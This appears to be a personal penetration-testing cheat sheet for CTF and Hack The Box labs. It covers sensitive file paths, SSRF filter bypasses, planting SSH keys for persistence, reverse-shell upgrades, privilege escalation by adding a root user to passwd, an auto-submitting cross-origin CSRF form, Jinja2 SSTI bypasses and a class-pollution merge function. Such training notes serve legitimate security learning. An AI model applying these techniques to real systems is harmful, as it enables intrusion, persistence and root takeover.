# Table of Content
<!-- TOC -->

- [Table of Content](#table-of-content)
- [Useful stuff](#useful-stuff)
    - [Paths](#paths)
    - [Commands](#commands)
    - [Port Forwarding](#port-forwarding)
    - [Websites](#websites)
    - [Implanting SSH keys](#implanting-ssh-keys)
    - [Transferring files with SCP](#transferring-files-with-scp)
    - [Reverse Shell Upgrade](#reverse-shell-upgrade)
    - [Privilege Escalation](#privilege-escalation)
- [Notes from older exploits](#notes-from-older-exploits)
    - [CSS Injection](#css-injection)
    - [SSTI](#ssti)
        - [Cross Origin problems](#cross-origin-problems)
        - [Jinja2](#jinja2)
    - [Class Pollution](#class-pollution)

<!-- /TOC -->
# Useful stuff
## Paths
/etc/nginx/nginx.conf\
/etc/nginx/sites-enabled/(deafult)\
/etc/nginx/sites-available\
/etc/hosts\
$HOME/.shh/id_rsa\
/proc/self/environ\
/proc/self/cmdline\
/etc/shadow

Nella root della webApp:\
index.js/html\
main.js/html

## Commands
netstat -antp\
sudo -l\
whoami\
linpeas - WINpeas\

Bypass ip filter or perform SSRF to localhost:
1. http://localtest.me
2. Append to url: .nip.io

ngrok tcp 80\
`dig` to resolve your tunnel hostname and use ip instead

## Port Forwarding
when you find a service on a machine running only locally you can forward it to your local port using:\
- when you already have ssh (user):\
`ssh -L 9090:localhost:8080 remote_user@host.htb`\
then visiting localhost:9090 you can access the service on host.htb:8080 (might need to add domain to /etc/hosts)
- when you dont have but a simple remote shell:\
`search chisel or others`


## Websites
bypass local security restriction: https://gtfobins.github.io/ \
payload: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md \
https://book.hacktricks.xyz/ \
intercept and modify requests, public endpoint:
- https://pipedream.com/requestbin 
- https://webhook.site/#!/view/36d22d40-393f-4680-a239-cf0d7488e238 
- https://testt.free.beeceptor.com

## Implanting SSH keys
`echo "Your SSH public key here (id_rsa.pub)" > /home/<user>/.ssh/authorized_keys`

## Transferring files with SCP
from destination to source:
`scp path_file_to_send dest_user@dest_ip:/path_to_receive`

from source to destination:
`scp dest_user@dest_ip:/path_to_receive files_received `

## Reverse Shell Upgrade
when you get a shell through nc, it's usually not possibile to use arrow keys so it's needed a "shell upgrade" as following:

    python3 -c 'import pty; pty.spawn("/bin/bash")' 
    ctrl + z 
    stty raw -echo; fg 
    Enter twice 
 
additionally: \
`export TERM=xterm`

additionally: (to fix terminal when writing very long payloads)\
`stty -a`  on own machine to read rows and columns values\
`stty rows ** columns **`  using same values seen on own machine

## Privilege Escalation

 - if you can modify perms of a file with sudo, you can create a symlink to passwd e grant yoursef perms to W and add a user with perms to root like "test::0:0:test:/root:/bin/bash"

# Notes from older exploits
bypass http blacklist filter with `dict://` `gopher://`
test antivirus or signature check using EICAR Files
    
## CSS Injection
when page header are set like font: None *
## SSTI
### Cross Origin problems
when trying to exploit it causing Cross Origin requests, the PREFLIGHT requests is automatically sent, that if not correctly handled might break the SSTI (even if AllowOrigin: *). To avoid sending the preflight use host a server that replies with the following:

```html
<html>
  <body>
    <form
      action="http://target/endpoint"
      method="POST"
      enctype="text/plain"
    >
      <input
        type="hidden"
        name='{"key_example": "value_example"'
        value='"}'
      />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Esempio: [exploit.](../hack_the_box/htb_challenges/web/TornadoService/writeup.md)

### Jinja2
bypass blacklisted character: https://ctf.zeyu2001.com/2022/securinets-ctf-finals-2022/strong \
using filter to get arguments from url or headers or form (if it is a post) which contains desidered blacklisted char\
example: https://github.com/Gianlush/Workspace_Ethical_Hacking/tree/main/hack_the_box/htb_challenges/web/DoxPit - `request|attr('args')|list|last`

Esempio: [exploit.](../hack_the_box/htb_challenges/web/DoxPit/writeup.md)

## Class Pollution 

```python
# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

Esempio: [exploit.](../hack_the_box/htb_challenges/web/TornadoService/writeup.md)